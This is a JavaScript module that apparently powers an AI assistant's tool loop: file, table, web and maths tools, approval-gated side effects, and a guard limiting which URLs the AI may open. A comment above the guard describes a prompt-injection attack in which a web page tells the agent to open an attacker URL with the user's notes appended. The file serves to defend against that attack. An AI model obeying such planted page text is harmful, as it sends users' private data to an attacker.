/**
 * The tool finder: every tool the AI can use, whether it is ready here, and
 * what it needs when it is not. Chat steps use tools through one loop.
 *
 * A tool is one of:
 *   ready        runs now (file reading, tables, web pages, maths…)
 *   needs …      waits for something only a person can give: a connected
 *                account, a service key, a sandbox. The AI says exactly which.
 * Tools with side effects (a reminder, a calendar event, spending money,
 * running code) never run inside the loop: they become proposed actions the
 * person approves (see run-actions.js).
 */

import { callModel } from './runtime.js';
import { parseJsonObject } from './structured.js';
import { webFetch, webDownload } from './tools/web.js';
import { mathEvaluate } from './tools/math.js';
import { readAttachment, withOverlay } from './attachments.js';
import { describeTable } from './documents.js';
import { readDocumentIsolated } from './document-runner.js';
import { screenToolInput, recordRefusal, blockedTopicsFrom } from './safety.js';
import { isSensitiveWorkspacePath } from './workspace-path.js';

const text = value => String(value ?? '').trim();
const MAX_TOOL_CHARS = 30_000;
export const MAX_TOOL_ROUNDS = 6;

/** Tools contributed by other modules (scheduling, connections, sandbox). */
const EXTENSIONS = [];
export function registerTools(definitions) {
  for (const definition of definitions) {
    const index = EXTENSIONS.findIndex(item => item.name === definition.name);
    if (index >= 0) EXTENSIONS.splice(index, 1, definition); else EXTENSIONS.push(definition);
  }
}

const clip = (value, max = MAX_TOOL_CHARS) => {
  const textValue = typeof value === 'string' ? value : JSON.stringify(value);
  return textValue.length > max ? `${textValue.slice(0, max)}… (${textValue.length - max} more characters)` : textValue;
};

function findAttachment(ctx, name) {
  const wanted = text(name).toLowerCase();
  const files = ctx.attachments ?? [];
  return files.find(file => text(file.name).toLowerCase() === wanted)
    ?? files.find(file => text(file.name).toLowerCase().includes(wanted))
    ?? (files.length === 1 && !wanted ? files[0] : null);
}

const BUILT_IN = [
  {
    name: 'file.read',
    title: 'Read an attached file',
    description: 'Read the text of an attached PDF, Word, Excel, PowerPoint, CSV or text file, from a character offset.',
    input: { file: 'file name', offset: 'character to start at (default 0)', length: `characters (default and max ${MAX_TOOL_CHARS})` },
    ready: ctx => (ctx.attachments?.length ? { ready: true } : { ready: false, needs: 'files', reason: 'No files are attached. Ask the person to attach them.' }),
    async run(input, ctx) {
      const file = findAttachment(ctx, input.file);
      if (!file) return { error: `No attached file matches "${text(input.file)}". Attached: ${(ctx.attachments ?? []).map(item => item.name).join(', ') || 'none'}.` };
      if (isSensitiveWorkspacePath(file.name)) return { error: 'Credential-bearing files cannot be exposed to the AI through the file tool.', code: 'sensitive-file-blocked' };
      const read = await readAttachment(ctx.objects, ctx.scope, file);
      if (read.error) return { error: read.error };
      if (read.kind === 'image') return { file: read.name, kind: 'image', note: 'This image is shown to you with the next message.', showImage: read.image };
      const offset = Math.max(0, Math.floor(Number(input.offset) || 0));
      const length = Math.min(MAX_TOOL_CHARS, Math.max(1, Math.floor(Number(input.length) || MAX_TOOL_CHARS)));
      // A project carried into a follow-up is read as its latest version.
      const overlay = ctx.run?.adaptation?.projectOverlay;
      const full = read.format === 'project' && Array.isArray(read.files) && overlay?.length
        ? withOverlay(read.files, overlay).map(item => `--- ${item.path} ---\n${item.content}`).join('\n\n')
        : read.text ?? '';
      return {
        file: read.name, format: read.format, pages: read.pages, totalChars: full.length,
        offset, text: full.slice(offset, offset + length),
        ...(offset + length < full.length ? { next: offset + length } : {}),
        ...(read.scanned ? { note: 'This PDF looks scanned; it has little or no text.' } : {})
      };
    }
  },
  {
    name: 'data.analyze',
    title: 'Analyse a table',
    description: 'Describe a spreadsheet or CSV: rows, and per column the type, count, min, max, mean, median, sum or most common values.',
    input: { file: 'file name', sheet: 'sheet name (Excel, optional)', header: 'first row holds column names (default true)' },
    ready: ctx => (ctx.attachments?.some(file => ['xlsx', 'csv'].includes(file.format)) ? { ready: true } : { ready: false, needs: 'files', reason: 'No spreadsheet or CSV is attached.' }),
    async run(input, ctx) {
      const file = findAttachment(ctx, input.file);
      if (!file) return { error: `No attached file matches "${text(input.file)}".` };
      if (isSensitiveWorkspacePath(file.name)) return { error: 'Credential-bearing files cannot be exposed to the AI through the file tool.', code: 'sensitive-file-blocked' };
      const read = await readAttachment(ctx.objects, ctx.scope, file);
      if (read.error) return { error: read.error };
      if (!read.tables?.length) return { error: `${read.name} is not a table.` };
      const table = read.tables.find(item => text(item.name).toLowerCase() === text(input.sheet).toLowerCase()) ?? read.tables[0];
      return { file: read.name, sheet: table.name, sheets: read.tables.map(item => item.name), ...describeTable(table.rows, { headerRow: input.header !== false }) };
    }
  },
  {
    name: 'web.fetch',
    title: 'Read a public web page',
    description: 'Fetch the readable text of a public https page (datasheets, standards, prices, weather), with its final address and a digest.',
    input: { url: 'https URL of a public page' },
    network: true,
    ready: ctx => (ctx.config?.tools?.webAccess === false ? { ready: false, needs: 'admin', reason: 'Web access is turned off on this site (TOOLS_WEB_ACCESS).' } : { ready: true }),
    async run(input, ctx) {
      const result = await webFetch(input, { fetchImpl: ctx.fetchImpl, ...(ctx.webOptions ?? {}) });
      return { title: result.output.title, url: result.provenance.finalUrl, content: result.output.content, retrievedAt: result.provenance.retrievedAt, sha256: result.provenance.sha256 };
    }
  },
  {
    name: 'web.search',
    title: 'Search the web',
    description: 'Search the web for current facts, data, prices, standards, datasheets, weather or news. Returns findings with their sources; read a source with web.fetch or web.download for the full text.',
    input: { query: 'what to find, as specific as possible', why: 'what the answer will be used for' },
    network: true,
    ready: ctx => (ctx.config?.tools?.webAccess === false
      ? { ready: false, needs: 'admin', reason: 'Web access is turned off on this site (TOOLS_WEB_ACCESS).' }
      : ctx.config?.ai ? { ready: true } : { ready: false, needs: 'admin', reason: 'Searching needs the AI model, and none is connected.' }),
    async run(input, ctx) {
      const query = text(input.query).slice(0, 400);
      if (!query) return { error: 'Say what to search for.' };
      const found = await callModel([
        { role: 'system', content: 'Search the web and report what you find for the query: the facts and numbers, each with its source URL, and say plainly when sources disagree or nothing reliable was found. Do not answer from memory.' },
        { role: 'user', content: JSON.stringify({ query, purpose: text(input.why).slice(0, 300) }) }
      ], {
        config: ctx.config,
        fetchImpl: ctx.fetchImpl,
        webSearch: true,
        retries: 0,
        modelId: ctx.modelId || null,
        effort: 'low',
        usageGate: ctx.usageGate,
        usageSource: 'web-search'
      });
      if (!found) return { error: 'Search is not available.' };
      ctx.onUsage?.(found.usage, 'web.search');
      // An answer from memory is not a search result: say search is down.
      if (found.webSearchUnavailable) return { error: 'Web search is not available right now (its quota is used up or it was refused). Read a known page with web.fetch, or answer from what you know and say plainly that it was not checked against current sources.' };
      if (found.incomplete) return { error: `The search did not finish (${found.incomplete}).` };
      const citations = (Array.isArray(found.citations) ? found.citations : [])
        .map(item => {
          const url = text(item?.url || item?.uri);
          return url ? { ...item, url } : null;
        })
        .filter(Boolean);
      return { query, findings: found.text, sources: citations, citations };
    }
  },
  {
    name: 'web.download',
    title: 'Download a file from the web',
    description: 'Download a public PDF, Word, Excel, PowerPoint, CSV, JSON or text file (up to 20 MB) and read it as text and tables.',
    input: { url: 'https URL of the file', offset: 'character to start at (default 0)' },
    network: true,
    ready: ctx => (ctx.config?.tools?.webAccess === false ? { ready: false, needs: 'admin', reason: 'Web access is turned off on this site (TOOLS_WEB_ACCESS).' } : { ready: true }),
    async run(input, ctx) {
      const file = await webDownload({ url: input.url }, { ...(ctx.webOptions ?? {}) });
      const read = await readDocumentIsolated(file.body, { name: file.name, contentType: file.contentType });
      const offset = Math.max(0, Math.floor(Number(input.offset) || 0));
      const full = read.text ?? '';
      return {
        url: file.provenance.finalUrl, name: file.name, format: read.format, pages: read.pages,
        sha256: file.provenance.sha256, retrievedAt: file.provenance.retrievedAt,
        ...(read.kind === 'image' ? { note: 'This image is shown to you with the next message.', showImage: read.image } : {}),
        ...(read.tables?.length ? { tables: read.tables.map(table => ({ name: table.name, ...describeTable(table.rows) })) } : {}),
        totalChars: full.length, text: full.slice(offset, offset + MAX_TOOL_CHARS),
        ...(offset + MAX_TOOL_CHARS < full.length ? { next: offset + MAX_TOOL_CHARS } : {})
      };
    }
  },
  {
    name: 'math.evaluate',
    title: 'Calculate',
    description: 'Evaluate an arithmetic expression exactly (sqrt, sin, log, pi, e, ^…); no code runs.',
    input: { expression: 'e.g. "0.5 * 1.2 * 20^2"' },
    ready: () => ({ ready: true }),
    run: input => mathEvaluate(input).output
  }
];

/** Built-in tools, registered ones, and the tools this workspace built (ctx.dynamicTools). */
function allowedToolSet(ctx = {}) {
  if (!Array.isArray(ctx.allowedTools)) return null;
  return new Set(ctx.allowedTools.map(text).filter(Boolean));
}

function allTools(ctx = {}) {
  const allowed = allowedToolSet(ctx);
  const tools = [...BUILT_IN, ...EXTENSIONS, ...(Array.isArray(ctx.dynamicTools) ? ctx.dynamicTools : [])];
  return allowed ? tools.filter(tool => allowed.has(tool.name)) : tools;
}

/** Every tool with its state for this context: ready, or what it needs. */
export function toolCatalog(ctx = {}) {
  return allTools(ctx).map(tool => {
    const state = tool.ready?.(ctx) ?? { ready: true };
    return {
      name: tool.name, title: tool.title, description: tool.description, input: tool.input,
      sideEffect: tool.sideEffect === true, ready: state.ready !== false,
      ...(state.ready === false ? { needs: state.needs, reason: state.reason } : {})
    };
  });
}

export function toolNamed(name, ctx = {}) {
  const wanted = text(name);
  const allowed = allowedToolSet(ctx);
  if (allowed && !allowed.has(wanted)) return null;
  return allTools(ctx).find(tool => tool.name === wanted) ?? null;
}

/**
 * Run one tool for the AI. Side-effect tools are proposed, not run; tools
 * that are not ready say what they need. Errors are returned, never thrown,
 * so the AI can adapt.
 */
export async function useTool(name, input, ctx) {
  const wanted = text(name);
  const allowed = allowedToolSet(ctx);
  if (allowed && !allowed.has(wanted)) return { error: `That tool is outside the current adaptive scope: "${wanted}".`, code: 'tool-out-of-scope' };
  const tool = toolNamed(wanted, ctx);
  if (!tool) return { error: `There is no tool "${wanted}". Available: ${toolCatalog(ctx).filter(item => item.ready).map(item => item.name).join(', ')}.` };
  const state = tool.ready?.(ctx) ?? { ready: true };
  if (state.ready === false) return { notReady: true, needs: state.needs, reason: state.reason };
  const safeInput = input && typeof input === 'object' && !Array.isArray(input) ? input : {};
  // What is made on the person's behalf follows the usage policy too.
  const declined = screenToolInput(tool.name, safeInput, { blockedTopics: blockedTopicsFrom(ctx.config) });
  if (declined) {
    if (ctx.pool && ctx.scope?.workspaceId) await recordRefusal(ctx.pool, ctx.scope, { category: declined.category, source: 'tool', topic: declined.topic });
    return { error: `${declined.message} Offer instead: ${declined.alternatives.join(' ')}`, declined: declined.category };
  }
  if (tool.sideEffect) {
    if (!ctx.propose) return { error: `${tool.title} changes something outside this chat and needs the person's approval, which is not possible in this step.` };
    const summary = text(await tool.summarize?.(safeInput, ctx) ?? `${tool.title}`).slice(0, 300);
    const check = await tool.validate?.(safeInput, ctx);
    if (check?.error) return { error: check.error };
    const action = await ctx.propose({ tool: tool.name, input: safeInput, summary });
    return { proposed: true, actionId: action.id, summary, note: 'This waits for the person to approve it. Tell them what you proposed; do not say it is done.' };
  }
  try {
    return await tool.run(safeInput, ctx);
  } catch (error) {
    return { error: text(error?.message) || 'The tool failed.' };
  }
}

const TOOL_PROTOCOL = [
  'TOOLS. You may use tools before answering. To use one, reply with ONLY a JSON object and nothing else:',
  '{"tool":"<name>","input":{...},"why":"<one short sentence>"}',
  'You will get the result and can use another tool or answer. When you answer, reply normally (not as a tool call).',
  'Use tools when they make the answer more correct: read attached files rather than guessing, analyse tables, calculate numbers, read public pages for facts that change.',
  'A tool that is not ready lists what it needs; tell the person exactly that instead of pretending.',
  'A tool marked sideEffect is only proposed: the person approves it. Say what you proposed; never claim it happened.'
].join('\n');

/**
 * The tool list as the AI reads it. A tool that is not ready cannot be
 * called, so it is listed without its input format: only what it does and
 * what it needs, which is what the AI tells the person.
 */
export function toolPrompt(ctx) {
  const catalog = toolCatalog(ctx);
  return `${TOOL_PROTOCOL}\nAvailable tools:\n${JSON.stringify(catalog.map(tool => ({
    name: tool.name, does: tool.description,
    ...(tool.ready ? { input: tool.input } : { notReady: tool.reason, needs: tool.needs }),
    ...(tool.sideEffect ? { sideEffect: true } : {})
  })))}`;
}

/** A reply that is only a tool call, or null. */
export function parseToolCall(reply) {
  const trimmed = text(reply);
  if (!trimmed.startsWith('{') && !trimmed.startsWith('```')) return null;
  const parsed = parseJsonObject(trimmed);
  return parsed && typeof parsed.tool === 'string' && parsed.tool ? { tool: parsed.tool, input: parsed.input ?? {}, why: text(parsed.why).slice(0, 200) } : null;
}

/* ------------------------------------------------ where the AI may reach */

// Tools that send a request to an address the AI chooses.
const REACHING_TOOLS = new Set(['web.fetch', 'web.download']);
const URL_PATTERN = /https?:\/\/[^\s<>"'`)\]]+/gi;
const DOMAIN_PATTERN = /\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/gi;

const textOf = content => (typeof content === 'string' ? content
  : Array.isArray(content) ? content.map(part => (typeof part === 'string' ? part : part?.text ?? '')).join('\n') : '');

/** One spelling per address: no fragment, no trailing punctuation, lower-case scheme and host. */
export function normalizeAddress(raw) {
  try {
    const url = new URL(String(raw ?? '').trim().replace(/[.,;:!?]+$/, ''));
    if (!['http:', 'https:'].includes(url.protocol)) return '';
    url.hash = '';
    return url.toString();
  } catch {
    return '';
  }
}

const hostOf = address => { try { return new URL(address).hostname.toLowerCase().replace(/^www\./, ''); } catch { return ''; } };

/**
 * Which addresses the AI may open in this answer. Reading your data and
 * reading the open web in one agent is how prompt injection steals data: a
 * page says "now open https://attacker/?d=<their notes>". So the AI may only
 * open an address that the person gave (or any page on a site they named),
 * that a web search returned, or that appeared word for word in something
 * already read. An address the AI built itself, with data glued on, is
 * never on that list.
 */
export function createReach(messages = []) {
  const exact = new Set();
  const hosts = new Set();
  for (const message of messages) {
    if (message?.role !== 'user') continue;
    const said = textOf(message.content);
    for (const found of said.match(URL_PATTERN) ?? []) {
      const address = normalizeAddress(found);
      if (address) { exact.add(address); hosts.add(hostOf(address)); }
    }
    for (const domain of said.match(DOMAIN_PATTERN) ?? []) hosts.add(domain.toLowerCase().replace(/^www\./, ''));
  }
  return {
    /** Learn the addresses a tool result shows: its sources, its own address, and links in its text. */
    learn(result) {
      const add = value => { const address = normalizeAddress(value); if (address) exact.add(address); };
      for (const source of Array.isArray(result?.sources) ? result.sources : []) add(source?.url);
      if (result?.url) add(result.url);
      for (const field of [result?.content, result?.text, result?.findings]) {
        for (const found of (typeof field === 'string' ? field : '').match(URL_PATTERN) ?? []) add(found);
      }
    },
    allows(raw) {
      const address = normalizeAddress(raw);
      if (!address) return false;
      if (exact.has(address)) return true;
      const host = hostOf(address);
      return [...hosts].some(named => host === named || host.endsWith(`.${named}`));
    }
  };
}

const UNREACHABLE = 'For safety, only addresses that the person gave, that a web search returned, or that appeared on a page already read can be opened. Search for this page first with web.search, or ask the person for the link.';

/**
 * Ask the model, letting it use tools, until it answers. Returns the final
 * answer (as callModel does) plus `toolLog` and summed `usage`.
 */
export async function answerWithTools(messages, ctx, { config, fetchImpl, maxRounds = MAX_TOOL_ROUNDS, ...options } = {}) {
  const conversation = messages[0]?.role === 'system'
    ? [{ ...messages[0], content: `${messages[0].content}\n\n${toolPrompt(ctx)}` }, ...messages.slice(1)]
    : [{ role: 'system', content: toolPrompt(ctx) }, ...messages];
  const toolLog = [];
  const sources = new Map();
  const reach = createReach(messages);
  const usage = { inputTokens: 0, outputTokens: 0 };
  // Tools that call the model themselves (web.search) add to this step's usage.
  const toolCtx = { ...ctx, usageGate: ctx.usageGate, onUsage: (used, source) => {
    usage.inputTokens += used?.inputTokens ?? 0;
    usage.outputTokens += used?.outputTokens ?? 0;
    ctx.onUsage?.(used, source);
  } };
  for (let round = 0; ; round += 1) {
    // Once a tool has run, the next model turn is synthesis. Do not re-open
    // provider web search on that turn, or a tool result can start another
    // search cycle instead of converging on the requested answer.
    const answer = await callModel(conversation, {
      config, fetchImpl, ...options,
      ...(round > 0 ? { webSearch: false } : {})
    });
    if (!answer) return null;
    usage.inputTokens += answer.usage?.inputTokens ?? 0;
    usage.outputTokens += answer.usage?.outputTokens ?? 0;
    // Preserve model-grounded sources immediately. This is important for a
    // tool-backed research step: the search result may itself contain
    // citations even when the final synthesis does not repeat them.
    for (const source of Array.isArray(answer.citations) ? answer.citations : []) {
      if (source?.url) sources.set(source.url, source);
    }
    const call = answer.incomplete ? null : parseToolCall(answer.text);
    const cited = () => [...new Map([
      ...sources.values(),
      ...(answer.citations ?? [])
    ].filter(item => item?.url).map(item => [item.url, item])).values()];
    if (!call) return { ...answer, citations: cited(), usage, toolLog };
    if (round >= maxRounds) {
      // One last call without tools: the person gets an answer, not a loop.
      conversation.push({ role: 'assistant', content: answer.text }, { role: 'user', content: 'No more tools can be used. Answer now with what you have.' });
      const last = await callModel(conversation, { config, fetchImpl, ...options });
      if (!last) return null;
      usage.inputTokens += last.usage?.inputTokens ?? 0;
      usage.outputTokens += last.usage?.outputTokens ?? 0;
      return { ...last, citations: [...sources.values()], usage, toolLog };
    }
    const result = REACHING_TOOLS.has(text(call.tool)) && !reach.allows(call.input?.url)
      ? { error: UNREACHABLE, code: 'address-not-from-a-trusted-source' }
      : await useTool(call.tool, call.input, toolCtx);
    if (!result?.error) reach.learn(result);
    const { showImage, ...shown } = result ?? {};
    // Where facts came from, so the answer can cite them.
    for (const source of [
      ...(Array.isArray(result?.sources) ? result.sources : []),
      ...(Array.isArray(result?.citations) ? result.citations : [])
    ]) {
      const url = text(source?.url || source?.uri);
      if (url) sources.set(url, { ...source, url });
    }
    if (result?.url && !result.error) sources.set(result.url, { url: result.url, title: result.title || result.name || '' });
    toolLog.push({
      round, tool: call.tool, why: call.why,
      outcome: result?.error ? 'error' : result?.notReady ? 'not-ready' : result?.proposed ? 'proposed' : 'ok',
      ...(result?.error ? { error: result.error } : {}), ...(result?.needs ? { needs: result.needs } : {}),
      ...(result?.actionId ? { actionId: result.actionId } : {}),
      ...(Array.isArray(result?.citations) && result.citations.length ? { sources: result.citations } : {}),
      ...(Array.isArray(result?.sources) && result.sources.length ? { sources: result.sources } : {})
    });
    conversation.push(
      { role: 'assistant', content: answer.text },
      { role: 'user', content: `Tool result for ${call.tool}:\n${clip(shown)}`, ...(showImage ? { images: [showImage] } : {}) }
    );
  }
}
